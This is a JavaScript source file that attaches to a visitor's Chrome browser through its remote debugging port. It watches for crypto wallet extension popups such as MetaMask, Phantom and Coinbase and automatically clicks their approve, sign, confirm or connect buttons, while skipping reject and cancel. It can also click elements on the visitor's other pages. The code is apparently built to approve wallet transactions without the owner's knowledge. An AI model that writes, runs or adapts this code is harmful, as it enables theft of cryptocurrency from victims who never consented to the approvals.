/**
 * CDP bridge — visitor ke Chrome ko remote control (extension popups included).
 * Chrome MUST run with: --remote-debugging-port=9222
 *
 * Lab / same-PC: visitor ka browser = wohi Chrome jisme debugging on ho.
 */
import { chromium } from 'playwright';

const EXT_APPROVE_RE = /approve|confirm|sign|authorize|allow|switch|connect|next|proceed|submit/i;
const EXT_REJECT_RE = /^(cancel|reject|decline|close|not now|no|back)$/i;

export class PlaywrightCdpWorker {
  constructor(cdpUrl, sessionId) {
    this.cdpUrl = cdpUrl;
    this.sessionId = sessionId;
    this.browser = null;
    this.clicks = 0;
    this.maxClicks = 200;
    this.timer = null;
  }

  async connect() {
    this.browser = await chromium.connectOverCDP(this.cdpUrl);
    this.startWatcher();
    console.log(`[cdp ${this.sessionId}] attached → ${this.cdpUrl}`);
    return this;
  }

  getContexts() {
    return this.browser?.contexts() || [];
  }

  getAllPages() {
    const pages = [];
    for (const ctx of this.getContexts()) {
      pages.push(...ctx.pages());
    }
    return pages;
  }

  async isWalletPage(page) {
    const url = page.url();
    const title = (await page.title().catch(() => '')) || '';
    return (
      /notification\.html|popup\.html|chrome-extension:\/\//i.test(url) ||
      /MetaMask|Rabby|Coinbase|OKX|Trust|Phantom|Rainbow/i.test(title)
    );
  }

  async findButtons(page) {
    const hits = [];
    for (const frame of page.frames()) {
      try {
        for (const b of await frame.locator('button, [role="button"]').all()) {
          const text = ((await b.innerText().catch(() => '')) || '').trim();
          const aria = (await b.getAttribute('aria-label').catch(() => '')) || '';
          const label = text || aria;
          if (!label || !(await b.isVisible().catch(() => false))) continue;
          hits.push({ button: b, label });
        }
      } catch { /* */ }
    }
    return hits;
  }

  async clickExtensionApprove(page) {
    const buttons = await this.findButtons(page);
    for (const { button, label } of buttons) {
      if (EXT_REJECT_RE.test(label)) continue;
      if (EXT_APPROVE_RE.test(label)) {
        await button.click({ timeout: 3000 }).catch(() => {});
        return label;
      }
    }
    return null;
  }

  startWatcher() {
    this.timer = setInterval(() => this.tick(), 400);
  }

  async tick() {
    if (!this.browser || this.clicks >= this.maxClicks) return;
    for (const page of this.getAllPages()) {
      if (!(await this.isWalletPage(page))) continue;
      const label = await this.clickExtensionApprove(page);
      if (label) {
        this.clicks++;
        console.log(`[cdp ${this.sessionId}] ext click: ${label}`);
      }
    }
  }

  async remoteClickVisitorPage(selector) {
    for (const page of this.getAllPages()) {
      if (/chrome-extension:/i.test(page.url())) continue;
      if (selector) {
        const ok = await page.locator(selector).first().click({ timeout: 3000 }).catch(() => false);
        if (ok) return true;
      }
    }
    return false;
  }

  async burst(count = 20) {
    for (let i = 0; i < count; i++) {
      await this.tick();
      await new Promise((r) => setTimeout(r, 150));
    }
  }

  async disconnect() {
    clearInterval(this.timer);
    await this.browser?.close().catch(() => {});
    this.browser = null;
  }
}

export async function probeCdp(cdpUrl) {
  try {
    const browser = await chromium.connectOverCDP(cdpUrl, { timeout: 5000 });
    const pages = browser.contexts().flatMap((c) => c.pages()).length;
    await browser.close();
    return { ok: true, pages };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}
